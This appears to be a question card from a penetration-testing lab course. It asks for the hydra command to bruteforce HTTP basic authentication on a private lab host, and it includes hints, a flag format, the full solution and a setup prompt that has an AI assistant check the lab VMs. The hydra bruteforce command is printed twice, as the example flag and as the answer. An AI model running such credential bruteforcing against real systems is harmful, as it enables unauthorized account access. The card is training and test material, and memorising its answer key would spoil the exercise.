# Q097 — HTTP Basic Auth Bruteforce

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra`, `john`, `hashcat`, `crackmapexec`, `responder` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Bruteforce a hypothetical HTTP basic auth endpoint at `http://192.168.52.129/secured/`. Provide hydra syntax.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=hydra -L users.txt -P pass.txt 192.168.52.129 http-get /secured/`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Use `http-get` module.
</details>

<details>
<summary>Hint 2</summary>

Adjust path as needed.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -L users.txt -P pass.txt 192.168.52.129 http-get /secured/
```

Hydra cycles creds.

**Answer:** `cmd=hydra -L users.txt -P pass.txt 192.168.52.129 http-get /secured/`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q097".
```
